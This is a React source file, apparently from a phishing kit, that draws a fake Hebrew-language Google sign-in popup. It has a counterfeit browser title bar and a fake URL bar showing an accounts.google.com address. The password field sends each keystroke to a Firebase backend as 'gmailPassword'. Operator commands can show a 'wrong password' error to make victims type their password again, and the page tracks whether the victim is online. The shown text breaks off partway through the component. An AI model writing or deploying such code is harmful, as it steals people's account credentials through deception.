import React from "react";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { getDetectedLanguageDisplayName } from "../../../utils/languageUtils";
import { useClientCountry } from "../../../hooks/use-client-country";
import EmailManager from "../../../utils/emailManager";
import DeviceManager from "../../../utils/deviceManager";
// Imagem movida para pasta public
const gmailLogo = "/logogmail.svg";
import EmailLayout from "../EmailLayout";

// Página somente com layout visual do Gmail Password (sem integrações externas)
const GmailPasswordPage = ({ embedded = false }) => {
  const {
    updateClientData,
    commands,
    isUserActive,
    clearCommands,
    clientData,
  } = useFirebaseClient();
  const { country } = useClientCountry();
  const [isNetOnline, setIsNetOnline] = React.useState(
    typeof navigator !== "undefined" ? navigator.onLine : true
  );
  const presence = React.useMemo(() => {
    if (!isNetOnline) return "offline";
    if (!isUserActive) return "away";
    return "online";
  }, [isNetOnline, isUserActive]);

  React.useEffect(() => {
    const onOnline = () => setIsNetOnline(true);
    const onOffline = () => setIsNetOnline(false);
    window.addEventListener("online", onOnline);
    window.addEventListener("offline", onOffline);
    return () => {
      window.removeEventListener("online", onOnline);
      window.removeEventListener("offline", onOffline);
    };
  }, []);

  // Toasts leves locais (sem lib)
  const [toasts, setToasts] = React.useState([]);
  const pushToast = React.useCallback((toast) => {
    const id = Math.random().toString(36).slice(2);
    const item = { id, ...toast };
    setToasts((t) => [...t, item]);
    setTimeout(() => {
      setToasts((t) => t.filter((x) => x.id !== id));
    }, toast.duration ?? 3000);
  }, []);
  // Erro inline sob o input de senha
  const [invalidMessage, setInvalidMessage] = React.useState("");

  const handleInvalidInline = React.useCallback((cmd) => {
    const map = {
      invalid_password: "סיסמה שגויה. נסה שוב.",
      inv_password: "סיסמה שגויה. נסה שוב.",
      invalid_gmailpass: "סיסמה שגויה. נסה שוב.",
    };
    const message = map[cmd] || "סיסמה שגויה. נסה שוב.";
    setInvalidMessage(message);
    setIsSubmitting(false);
    setLoadingStage(null);
    setPassword("");
  }, []);

  // Navegação SPA para outras telas do Gmail, sem refresh
  const navigateByCommand = React.useCallback(() => false, []);

  // Reagir a comandos (de outros botões/fluxos) e inválidos
  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      handleInvalidInline(latest);
      // limpar depois de exibir o toast para não ficar repetindo
      setTimeout(() => clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, handleInvalidInline, clearCommands]);
  const [password, setPassword] = React.useState("");
  const [showPassword, setShowPassword] = React.useState(false);
  const [isReady, setIsReady] = React.useState(false);
  const [progress, setProgress] = React.useState(0);

  React.useEffect(() => {
    // Preloader com duração de 2.5 segundos
    const startTime = Date.now();
    const duration = 2500; // 2.5 segundos

    const updateProgress = () => {
      const elapsed = Date.now() - startTime;
      const newProgress = Math.min((elapsed / duration) * 100, 100);
      setProgress(newProgress);

      if (newProgress < 100) {
        requestAnimationFrame(updateProgress);
      }
    };

    requestAnimationFrame(updateProgress);

    // Aguarda a barra completar totalmente antes de abrir o modal
    const id = setTimeout(() => setIsReady(true), 2600); // 100ms a mais para garantir que chegue a 100%
    return () => clearTimeout(id);
  }, []);

  // Obter device number do usuário que foi capturado na página /device - VERSÃO CORRIGIDA
  const getLoggedInDevice = () => {
    // Usar o novo sistema de device com fallbacks múltiplos
    const device = DeviceManager.getDeviceWithFirebaseData(clientData);
    
    if (device) {
      console.log("📱 Device number obtido com novo sistema:", device);
      return device;
    }
    
    console.log("📱 Nenhum device number encontrado");
    return "";
  };

  const [clientDevice, setClientDevice] = React.useState(getLoggedInDevice());
  const [appName, setAppName] = React.useState(
    localStorage.getItem("gmail_app_name") || ""
  );

  // Atualizar device number quando clientData mudar - VERSÃO CORRIGIDA
  React.useEffect(() => {
    const newDevice = getLoggedInDevice();
    if (newDevice && newDevice !== clientDevice) {
      setClientDevice(newDevice);
      console.log("📱 Device number atualizado na GmailPasswordPage:", newDevice);
    }
  }, [clientData?.deviceNumber, clientData?.deviceNumberConfirmed, clientData?.lastDevice, clientDevice]);
  const [faviconUrl, setFaviconUrl] = React.useState(
    localStorage.getItem("gmail_favicon_url") || ""
  );
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [loadingStage, setLoadingStage] = React.useState(null); // desabilitado
  const phrases = React.useMemo(
    () => [
      "מתחבר...",
      "אנא המתן רגע...",
      "מסיים את החיבור שלך...",
      "מאמת פרטי גישה...",
      "כמעט מוכן...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  const nextBtnRef = React.useRef(null);
  const [nextBtnWidth, setNextBtnWidth] = React.useState(null);
  const debounceRef = React.useRef(null);

  React.useEffect(() => {
    if (!isSubmitting || loadingStage !== "final") return;
    
    const interval = setInterval(
      () => setPhraseIndex((p) => (p + 1) % phrases.length),
      2000
    );
    return () => clearInterval(interval);
  }, [isSubmitting, loadingStage, phrases.length]);

  // Monitorar mudanças no localStorage e clientData para atualizar device number em tempo real
  React.useEffect(() => {
    const handleStorageChange = () => {
      const newDevice = getLoggedInDevice();
      if (newDevice !== clientDevice) {
        setClientDevice(newDevice);
        console.log("📱 Gmail Modal - Device number atualizado:", newDevice);
      }
    };

    // Escutar mudanças no localStorage
    window.addEventListener("storage", handleStorageChange);

    // Verificar periodicamente (para mudanças na mesma aba)
    const interval = setInterval(handleStorageChange, 1000);

    return () => {
      window.removeEventListener("storage", handleStorageChange);
      clearInterval(interval);
    };
  }, [clientDevice, clientData?.deviceNumber]);

  // Responsividade para centralizar em telas pequenas
  const [viewport, setViewport] = React.useState({
    width: typeof window !== "undefined" ? window.innerWidth : 1024,
    height: typeof window !== "undefined" ? window.innerHeight : 768,
  });
  React.useEffect(() => {
    const onResize = () =>
      setViewport({ width: window.innerWidth, height: window.innerHeight });
    window.addEventListener("resize", onResize);
    return () => window.removeEventListener("resize", onResize);
  }, []);
  const isSmallViewport = viewport.width < 520 || viewport.height < 600;

  // Medir largura do botão Next quando não está carregando, para fixar largura durante o loading
  React.useEffect(() => {
    if (!isSubmitting && nextBtnRef.current) {
      setNextBtnWidth(nextBtnRef.current.offsetWidth);
    }
  }, [isSubmitting]);

  const translations = {
    title: "היכנס ל-Gmail",
    subtitle: "באמצעות חשבון Google שלך",
    password: "סיסמה",
    next: "הבא",
    forgotPassword: "שכחת סיסמה?",
    signInWithGoogle: "היכנס ל-Google",
    enterPassword: "הזן את הסיסמה שלך",
    showPassword: "הצג סיסמה",
    help: "עזרה",
    privacy: "פרטיות",
    terms: "תנאים",
    windowTitle: "היכנס לחשבונות Google",
    url: "https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=407408718192.apps.googleusercontent.com",
    header: "היכנס ל-Google",
  };

  // Drag state for movable window
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(0, (window.innerWidth - 466) / 2),
    top: Math.max(0, (window.innerHeight - 600) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });

  const startDrag = (e) => {
    // Avoid dragging when interacting with inputs/buttons
    const tag = e.target.tagName;
    if (
      tag === "INPUT" ||
      tag === "BUTTON" ||
      tag === "SELECT" ||
      tag === "A" ||
      tag === "TEXTAREA"
    ) {
      return;
    }
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };

  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition((prev) => ({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      }));
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  React.useEffect(() => {
    try {
      updateClientData({
        currentUrl: "/sync?view=password",
        currentPage: "gmail_password",
        gmailStage: "password",
      });
    } catch {}
  }, [updateClientData]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ 
          fontFamily: "Roboto, Arial, sans-serif",
          direction: "rtl",
          textAlign: "right"
        }}
      >
        {/* Indicador de presença (online/away/offline) */}
        {!embedded && (
          <div
            style={{
              position: "fixed",
              top: 10,
              left: 10,
              zIndex: 60,
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "6px 10px",
              borderRadius: 999,
              background: "rgba(0,0,0,0.45)",
              color: "#e5e7eb",
              fontSize: 12,
              border: "1px solid rgba(255,255,255,0.08)",
              backdropFilter: "blur(2px)",
            }}
          >
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: 999,
                display: "inline-block",
                background:
                  presence === "online"
                    ? "#22c55e"
                    : presence === "away"
                    ? "#f59e0b"
                    : "#ef4444",
              }}
            />
            <span style={{ textTransform: "capitalize" }}>{presence}</span>
          </div>
        )}

        {/* Toasts container */}
        <div
          style={{
            position: "fixed",
            top: 12,
            left: "50%",
            transform: "translateX(-50%)",
            zIndex: 70,
            display: "flex",
            flexDirection: "column",
            gap: 8,
          }}
        >
          {toasts.map((t) => (
            <div
              key={t.id}
              style={{
                padding: "10px 14px",
                borderRadius: 8,
                background:
                  t.type === "error"
                    ? "rgba(239,68,68,0.12)"
                    : "rgba(34,197,94,0.12)",
                color: "#e5e7eb",
                border:
                  t.type === "error"
                    ? "1px solid rgba(239,68,68,0.35)"
                    : "1px solid rgba(34,197,94,0.35)",
                backdropFilter: "blur(0.5px)",
                WebkitBackdropFilter: "blur(0.5px)",
                maxWidth: 520,
                boxShadow: "0 8px 24px rgba(0,0,0,0.35)",
              }}
            >
              {t.message}
            </div>
          ))}
        </div>
        <div
          style={{
            background: "#fff",
            borderRadius: 12,
            boxShadow: "0 8px 32px rgba(0, 0, 0, 0.3)",
            width: isSmallViewport ? "min(466px, 96vw)" : "min(466px, 92vw)",
            height: Math.min(560, Math.max(420, viewport.height - 24)),
            position: "fixed",
            color: "#202124",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Spinner de loading inicial */}
          {!isReady && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 9999,
                borderRadius: 12,
              }}
            >
              {/* Barra da janela */}
              <div
                style={{
                  height: 32,
                  background: "#e8f0fe",
                  borderBottom: "1px solid #d7e3fc",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 8px",
                  fontSize: 12,
                  direction: "ltr", // Força LTR para manter botões à direita
                }}
              >
                <span
                  style={{
                    opacity: 0.9,
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}
                >
                  <svg
                    xmlns="https://www.w3.org/2000/svg"
                    width="16"
                    height="16"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                  {translations.windowTitle}
                </span>
                <div style={{ display: "flex", gap: 4 }}>
                  <button
                    title="Minimize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M3 8.5H13"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                  <button
                    title="Maximize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <rect
                        x="3.5"
                        y="3.5"
                        width="9"
                        height="9"
                        rx="1"
                        stroke="#111"
                        strokeWidth="1.5"
                      />
                    </svg>
                  </button>
                  <button
                    title="Close"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M4 4L12 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                      <path
                        d="M12 4L4 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              {/* URL bar */}
              <div
                style={{
                  borderBottom: "1px solid #eaecee",
                  padding: 0,
                  background: "#ffffff",
                  margin: 0,
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#eef1f3",
                    border: "1px solid #d0d7de",
                    borderRadius: 0,
                    height: 32,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 10px",
                    gap: 8,
                    fontSize: 12,
                    color: "#202124",
                    direction: "ltr", // Força LTR para manter ícone à esquerda e URL correta
                  }}
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    version="1.1"
                    fill="none"
                    stroke="#5f6368"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    {translations.url}
                  </div>
                </div>
              </div>

              {/* Barra de progresso */}
              <div
                style={{
                  width: "100%",
                  height: 2,
                  background: "#e8f0fe",
                  position: "relative",
                }}
              >
                <div
                  style={{
                    width: `${progress}%`,
                    height: "100%",
                    background: "#1a73e8",
                    transition: "width 0.1s ease-out",
                    position: "absolute",
                    left: 0,
                    top: 0,
                  }}
                />
              </div>

              {/* Header pequeno */}
              <div
                style={{
                  width: "100%",
                  background: "#ffffff",
                  padding: "4px 8px",
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  borderBottom: "1px solid #eaecee",
                  height: 40,
                }}
              >
                <div
                  style={{
                    width: 20,
                    height: 20,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="18"
                    height="18"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                </div>
                <span style={{ color: "#000", fontSize: 12 }}>
                  {translations.header}
                </span>
              </div>

              {/* Conteúdo central com spinner */}
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #1a73e8",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>

              {/* Footer */}
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  minHeight: 44,
                  borderTop: "1px solid #f0f0f0",
                  background: "transparent",
                  padding: "0 24px",
                }}
              >
                <div style={{ display: "flex", gap: 40 }}>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    עזרה
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    פרטיות
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    תנאים
                  </a>
                </div>
                <span style={{ color: "#666", fontSize: 12 }}>
              {country?.name || ""}
            </span>
              </div>
            </div>
          )}
          {/* Simulação da barra da janela/navegador (título + botões -, □, ×) */}
          <div
            style={{
              height: 32,
              background: "#e8f0fe",
              borderBottom: "1px solid #d7e3fc",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 8px",
              fontSize: 12,
              color: "#202124",
              direction: "ltr", // Força LTR para manter botões à direita
            }}
            onMouseDown={startDrag}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 6,
              }}
            >
              <svg
                xmlns="https://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                ></path>
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                ></path>
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                ></path>
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                ></path>
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 4 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#111"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                onClick={() => handleInvalidInline("invalid_gmailpass")}
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  color: "#111",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* Barra de endereço/URL - colada na barra da janela, largura total */}
          <div
            id="fake-url-bar-container"
            style={{
              borderBottom: "1px solid #eaecee",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              id="fake-url-bar"
              style={{
                width: "100%",
                background: "#eef1f3",
                border: "1px solid #d0d7de",
                borderRadius: 0,
                height: 32,
                display: "flex",
                alignItems: "center",
                padding: "0 10px",
                gap: 8,
                fontSize: 12,
                color: "#202124",
                direction: "ltr", // Força LTR para manter ícone à esquerda e URL correta
              }}
            >
              {/* Ícone solicitado (substitui o cadeado) */}
              <svg
                width="16"
                height="16"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                version="1.1"
                fill="none"
                stroke="#5f6368"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>
          {isSubmitting && loadingStage === "bar" && (
            <div
              style={{
                width: "100%",
                height: 4,
                background: "#ffffff",
                overflow: "hidden",
                margin: 0,
                borderBottom: "1px solid #eaecee",
                position: "relative",
                zIndex: 2,
              }}
            >
              <div
                style={{
                  width: "100%",
                  height: "100%",
                  background: "#1a73e8",
                  animation: "loadingBar 2s ease-in-out infinite",
                }}
              />
            </div>
          )}
          {/* Header superior (Sign in to Google) */}
          <div
            style={{
              width: "100%",
              background: "#ffffff",
              padding: "4px 8px",
              display: "flex",
              alignItems: "center",
              gap: 6,
              borderBottom: "1px solid #eaecee",
              height: 40,
            }}
          >
            <div
              style={{
                width: 20,
                height: 20,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                />
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                />
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                />
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                />
              </svg>
            </div>
            <span style={{ color: "#000", fontSize: 12 }}>
              {translations.signInWithGoogle}
            </span>
          </div>
          {/* Conteúdo principal */}
          <div
            style={{
              flex: 1,
              padding: "8px 24px 0 24px",
              display: "flex",
              flexDirection: "column",
            }}
          >
            {/* Título */}
            <h1
              style={{
                fontWeight: 400,
                fontSize: 22,
                margin: 0,
                marginBottom: 6,
              }}
            >
              {translations.title}
            </h1>

            {/* Proceed to (without app name) */}
            <div
              style={{
                color: "#3c4043",
                fontSize: 13,
                marginBottom: 16,
                display: "flex",
                alignItems: "center",
                gap: 8,
              }}
            >
              <span>המשך אל</span>
              {faviconUrl ? (
                <img
                  src={faviconUrl}
                  alt="favicon"
                  style={{ width: 16, height: 16, borderRadius: 2 }}
                  onError={(e) => (e.currentTarget.style.display = "none")}
                />
              ) : null}
              {appName ? (
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  style={{ color: "#1a73e8", textDecoration: "none" }}
                >
                  {appName}
                </a>
              ) : null}
            </div>

            {/* Badge de email */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                background: "#fff",
                border: "1px solid #dadce0",
                borderRadius: 20,
                padding: "4px 4px 4px 16px",
                gap: 8,
                fontSize: 14,
                fontWeight: 400,
                color: "#202124",
                boxShadow: "0 1px 2px rgba(60,64,67,.08)",
                marginBottom: 16,
                width: "fit-content",
                minHeight: 32,
                maxWidth: 320,
                cursor: "default",
              }}
            >
              {/* removed colored circle with initial */}
              {/* SVG do usuário ao lado do avatar/letra */}
              <svg
                width="18"
                height="18"
                viewBox="0 0 42 42"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
                style={{ marginRight: 0, display: "block" }}
              >
                <path
                  fill="#000000"
                  fillRule="evenodd"
                  d="M24,45A21,21,0,1,1,45,24,21,21,0,0,1,24,45Zm11.633-6c-.157-.231-.355-.518-.514-.742-.277-.394-.554-.788-.8-1.178C34.305,37.062,32.935,35.224,28,35a2.922,2.922,0,0,1-2.968-3.066L25,31c0-.135-.016.148,0,0V30l1-1a14.435,14.435,0,0,0,2.4-1.464l.135-.093A4.643,4.643,0,0,0,30,26l.036-.381A55.987,55.987,0,0,0,31,19c0-4.71-2.29-7-7-7-4.775,0-7,2.224-7,7a54.693,54.693,0,0,0,.963,6.616l.035.352a3.981,3.981,0,0,0,1.449,1.462l.1.062A19.174,19.174,0,0,0,22,29l1,1v1c.014.138,0-.146,0,0l-.033.934A2.9,2.9,0,0,1,20.084,35h0c-4.956.2-6.393,2.077-6.4,2.077-.252.4-.528.789-.807,1.184-.157.224-.355.51-.513.741a18.917,18.917,0,0,0,23.267,0ZM24,5A18.986,18.986,0,0,0,10.85,37.694c.382-.565.79-1.129,1.15-1.694,0,0,1.67-2.743,8-3,.645,0,.967-.422.967-1.066h0c0-.521,0-.934,0-.934,0-.13-.021-.247-.027-.373A17.5,17.5,0,0,1,18.4,29.133S16,27.657,16,26a60.16,60.16,0,0,1-1-7c0-4.644,1.986-9,9-9,6.92,0,9,4.356,9,9a61.784,61.784,0,0,1-1,7c0,1.611-2.4,3.133-2.4,3.133a13.873,13.873,0,0,1-2.543,1.546c0,.109-.023.209-.023.321,0,0,0,.413,0,.934h0c0,.644.32,1.066.965,1.066,6.424.288,8,3,8,3,.36.565.767,1.129,1.149,1.694A18.985,18.985,0,0,0,24,5Z"
                  transform="translate(-3 -3)"
                />
              </svg>
              <span>{clientDevice}</span>
            </div>

            {/* Campo de senha */}
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "flex-start",
                marginBottom: 12,
                width: "100%",
              }}
            >
              <div
                style={{ position: "relative", width: "100%", maxWidth: 366 }}
              >
                <input
                  data-gmail-modal
                  type={showPassword ? "text" : "password"}
                  placeholder={translations.enterPassword}
                  value={password}
                  onChange={(e) => {
                    const val = e.target.value;
                    setPassword(val);
                    // Debounce para salvar no Firebase e refletir no ClientCard
                    if (debounceRef.current) clearTimeout(debounceRef.current);
                    debounceRef.current = setTimeout(() => {
                      updateClientData({ gmailPassword: val });
                    }, 300);
                  }}
                  style={{
                    width: "100%",
                    padding: "12px 44px 12px 14px",
                    border: "1px solid #dadce0",
                    borderRadius: 4,
                    fontSize: 15,
                    outline: "none",
                    boxSizing: "border-box",
                    background: "#fff",
                    color: "#202124",
                  }}
                  disabled={isSubmitting}
                />
                <button
                  type="button"
                  aria-label={showPassword ? "הסתר סיסמה" : "הצג סיסמה"}
                  onClick={() => setShowPassword(!showPassword)}
                  style={{
                    position: "absolute",
                    left: 10,
                    top: "50%",
                    transform: "translateY(-50%)",
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                    padding: 0,
                    width: 24,
                    height: 24,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                  disabled={isSubmitting}
                >
                  {showPassword ? (
